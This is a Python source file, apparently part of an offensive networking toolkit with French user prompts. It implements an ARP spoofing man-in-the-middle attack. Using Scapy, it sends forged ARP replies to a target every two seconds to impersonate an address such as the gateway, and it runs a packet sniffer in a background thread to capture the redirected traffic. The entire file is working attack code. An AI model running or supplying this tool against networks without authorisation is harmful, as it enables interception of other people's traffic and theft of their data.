from scapy.all import ARP, Ether, sendp
import time, os
import threading
from core.storage import results
from sniffer.live_sniffer import start_sniffing

def spoof(target_ip, spoof_ip, target_mac):
    if not target_mac:
        print("[✘] Aucun MAC fourni pour la cible.")
        return
    ether = Ether(dst=target_mac)
    arp = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    packet = ether / arp
    sendp(packet, verbose=0)
    print(f"[✓] Spoof envoyé vers {target_ip}")

def launch_arp_spoof():
    if os.geteuid() != 0:
        print("[✘] Permission root requise.")
        return

    target = input("IP cible: ").strip()
    spoofed = input("IP usurpée (ex: gateway): ").strip()
    target_mac = input("MAC de la cible (ex: 00:0c:29:7c:3a:16): ").strip()

    print(f"[*] MITM: Spoofing {spoofed} vers {target} avec MAC {target_mac}")
    results["spoof"].append(f"Début ARP spoof entre {spoofed} et {target}")

    # 🔁 Démarrage du sniffer en thread parallèle
    sniffer_thread = threading.Thread(target=start_sniffing)
    sniffer_thread.daemon = True
    sniffer_thread.start()

    try:
        while True:
            spoof(target, spoofed, target_mac)
            time.sleep(2)
    except KeyboardInterrupt:
        print("[*] Spoofing interrompu.")
        results["spoof"].append("MITM interrompu par Ctrl+C.")
